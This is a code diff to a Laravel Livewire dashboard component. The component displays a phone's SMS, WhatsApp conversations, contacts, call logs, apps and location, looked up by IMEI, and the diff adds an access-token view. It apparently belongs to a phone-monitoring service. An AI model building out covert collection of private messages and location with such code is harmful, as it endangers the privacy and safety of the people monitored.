@@ -15,7 +15,7 @@ use DB;
 class Home extends Component
 {
     public $phoneImei;
-    public $menu;
+    public $menu = 0;
     public $subMenu;
 
     // data
@@ -27,7 +27,8 @@ class Home extends Component
     public $contactList = [];
     public $callLogList = [];
     public $phoneList = [];
-    public $locationList = [];
+    private $locationList = [];
+    public $tokenList = [];
 
     public $whatsappList = [];
     public $whatsappConversationList = [];
@@ -85,19 +86,23 @@ class Home extends Component
     public function showLocation() {
         $this->resetChoice();
         $this->menu = '6';
-        $this->locationList = Location::where('imei',$this->phoneImei)->pluck('latitude','longitude');
+        $this->locationList = Location::where('imei',$this->phoneImei)->pluck('latitude','longitude')->toArray();
         // dd($this->locationList);
     }
     public function showPhone() {
         $this->resetChoice();
         $this->menu = '5';
     }
-
+    public function newToken() {
+        $this->resetChoice();
+        $this->menu = '8';
+        $this->tokenList = Auth::user()->mobileAccessToken;
+    }
 
     private function resetChoice() {
 
         //reset data entry
-        $this->reset(['smsConversationList','whatsappConversationList','smsList','appsList','contactList','callLogList','phoneList','locationList','whatsappList']);
+        $this->reset(['smsConversationList','whatsappConversationList','smsList','appsList','contactList','callLogList','phoneList','whatsappList']);
     }
 
     public function render()
@@ -108,6 +113,9 @@ class Home extends Component
             array_push($tmphones,$token->phone);
         }
         $this->phoneList = $tmphones;
-        return view('livewire.client.home');
+    
+        return view('livewire.client.home',[
+            "locationList" => $this->locationList,
+        ]);
     }
 }
